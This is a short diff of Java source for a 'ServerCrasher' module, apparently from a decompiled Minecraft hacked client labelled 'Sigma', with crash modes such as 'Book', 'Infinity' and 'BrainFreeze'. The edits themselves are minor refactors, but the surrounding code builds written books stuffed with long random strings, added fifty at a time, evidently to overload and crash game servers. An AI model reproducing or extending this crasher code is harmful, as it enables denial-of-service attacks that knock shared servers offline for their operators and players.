@@ -18,7 +18,7 @@ public class ServerCrasher extends PremiumModule
     
     public ServerCrasher() {
         super("ServerCrasher", "Crashes a server", Category.WORLD);
-        this.addSetting(new StringSetting("Mode", "Crasher mode", 0, new String[] { "Flying Enabled", "Vanilla", "Book", "Infinity", "BrainFreeze" }));
+        this.addSetting(new StringSetting("Mode", "Crasher mode", 0, "Flying Enabled", "Vanilla", "Book", "Infinity", "BrainFreeze"));
     }
     
     @Override
@@ -74,7 +74,7 @@ public class ServerCrasher extends PremiumModule
                     string += (char)Math.round(32.0f + (float)Math.random() * 94.0f);
                 }
                 for (int n4 = 0; n4 < 50; ++n4) {
-                    ((AbstractList<StringNBT>)class5745).add(new StringNBT(string));
+                    class5745.add(new StringNBT(string));
                 }
                 class5746.putString("author", "LeakedPvP");
                 class5746.putString("title", "Sigma");
